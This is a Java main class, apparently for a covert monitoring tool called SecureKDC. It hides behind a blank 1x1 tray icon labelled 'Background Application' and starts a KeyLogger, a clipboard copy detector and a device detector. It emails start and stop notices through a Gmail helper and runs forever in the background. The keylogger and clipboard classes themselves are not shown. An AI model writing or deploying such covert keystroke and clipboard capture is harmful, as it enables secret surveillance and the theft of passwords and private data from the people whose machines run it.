import java.awt.AWTException;
import java.awt.Image;
import java.awt.MenuItem;
import java.awt.PopupMenu;
import java.awt.SystemTray;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.awt.datatransfer.Clipboard;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.time.LocalTime;
import java.util.Date;

 public class SecureKDC {
	 static String from = "From_mail_id";
		static String to = "To_mail_id";
		static String subject;
		static String text;
			
    public static void main(String[] args) {
    	
        if (SystemTray.isSupported()) {
        	Date currentDate = new Date();
        	SecureKDC.subject = "SecureKDC stated";
        	SecureKDC.text = "SecureKDC started at " + currentDate;
        	GmailSender.sendEmil(SecureKDC.to, SecureKDC.from, SecureKDC.subject, SecureKDC.text);
        	
            SystemTray tray = SystemTray.getSystemTray();
             // Create a blank image for the tray icon
            Image image = new BufferedImage(1, 1, BufferedImage.TYPE_INT_ARGB);
             PopupMenu popupMenu = new PopupMenu();
            MenuItem exitItem = new MenuItem("Exit");
            exitItem.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                	Date currentDate = new Date();
                	 SecureKDC.subject = "SecureKDC ended";
                 	SecureKDC.text = "SecureKDC ended at " + currentDate;
                 	GmailSender.sendEmil(SecureKDC.to, SecureKDC.from, SecureKDC.subject, SecureKDC.text);
                    System.exit(0);
                }
            });
            popupMenu.add(exitItem);
             TrayIcon trayIcon = new TrayIcon(image, "Background Application", popupMenu);
            trayIcon.setImageAutoSize(true);
             try {
                tray.add(trayIcon);
            } catch (AWTException e) {
                System.out.println("TrayIcon could not be added.");
                return;
            }
             DeviceDetect.waitForNotifying();
            new KeyLogger();
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            CopyPasteDetector detector = new CopyPasteDetector();
            detector.copy(clipboard);
        } else {
            System.out.println("SystemTray is not supported.");
        }
         // Keep the application running in the background
        while (true) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
